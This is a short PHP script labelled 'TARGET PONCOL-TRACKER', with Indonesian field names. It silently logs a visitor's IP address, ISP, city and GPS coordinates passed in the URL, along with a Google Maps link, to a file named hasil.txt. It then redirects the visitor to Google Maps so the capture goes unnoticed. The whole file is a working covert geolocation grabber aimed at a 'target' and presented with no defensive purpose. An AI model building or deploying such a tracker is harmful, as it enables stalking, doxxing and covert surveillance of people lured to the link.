<?php
$ip = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'];
$details = json_decode(file_get_contents("http://ip-api.com/json/$ip"));
$isp = $details->isp ?? "Unknown";
$city = $details->city ?? "Unknown";

$log = "--- TARGET PONCOL-TRACKER ---\n";
$log .= "Waktu: " . date("H:i:s") . "\nIP: $ip\nISP: $isp\nKota: $city\n";
$log .= "Koordinat: " . $_GET['lat'] . "," . $_GET['lon'] . "\n";
$log .= "Maps: https://www.google.com/maps/place/" . $_GET['lat'] . "," . $_GET['lon'] . "\n";
$log .= "-----------------------------\n\n";

file_put_contents("hasil.txt", $log, FILE_APPEND);
header("Location: https://maps.google.com");
?>
